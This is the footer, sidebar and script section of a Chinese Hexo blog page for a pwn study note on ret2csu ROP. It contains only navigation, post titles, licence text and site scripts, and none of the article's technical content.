+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-08-19 00:45:41" itemprop="dateModified" datetime="2024-08-19T00:45:41+08:00">2024-08-19</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/c8624158.html" title="pwn学习笔记（9）-中级ROP--ret2csu">http://blog.g01den.top/posts/c8624158.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/9d5b1ce4.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture306.jpg" title="pwn学习笔记（8）-初识沙箱">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（8）-初识沙箱</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/97a7dff3.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture315.jpg" title="ctfshow-信息搜集">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
+  <h3>ctfshow-信息搜集</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09-%E4%B8%AD%E7%BA%A7ropret2csu"><span class="toc-number">1.</span> <span class="toc-text"> pwn 学习笔记（9）- 中级 ROP–ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc_csu_init%E5%87%BD%E6%95%B0%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">  libc_csu_init  函数基础：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.3.</span> <span class="toc-text"> 例子：</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/posts/c06afb6e.html" rel="bookmark" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></li><li><a href="/posts/c3c1bd42.html" rel="bookmark" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></li><li><a href="/posts/e20e7502.html" rel="bookmark" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></li><li><a href="/posts/52965aaa.html" rel="bookmark" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></li><li><a href="/posts/a698ff8.html" rel="bookmark" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></li><li><a href="/posts/cbafa55d.html" rel="bookmark" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></li><li><a href="/posts/efb4c08.html" rel="bookmark" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></li><li><a href="/posts/d7e2e20f.html" rel="bookmark" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></li><li><a href="/posts/9b0d93f7.html" rel="bookmark" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></li><li><a href="/posts/2c0210e1.html" rel="bookmark" title="how2heap_zh">how2heap_zh</a></li><li><a href="/posts/9d5b1ce4.html" rel="bookmark" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></li><li class="active"><a href="/posts/c8624158.html" rel="bookmark" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></li><li><a href="/posts/540e5c20.html" rel="bookmark" title="Pwn学习笔记（10）--UAF">Pwn学习笔记（10）--UAF</a></li><li><a href="/posts/f1497b96.html" rel="bookmark" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></li><li><a href="/posts/d1a08bca.html" rel="bookmark" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/9d5b1ce4.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/97a7dff3.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/b856856d.html" title="ctfshow-ssrf">ctfshow-ssrf</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
+</div>
+
+    <span><a href="/posts/20a3be2d.html" title="JavaWeb基础(一)-IO操作">JavaWeb基础(一)-IO操作</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路">从NSSCTF开始的复建之路</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/efb4c08.html" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/384200ef.html" title="SQL无列名注入">SQL无列名注入</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/a4378bd0.html" title="【2025】LitCTF">【2025】LitCTF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/666fe8df.html" title="【2024】强网杯">【2024】强网杯</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/a698ff8.html" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/c8624158.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
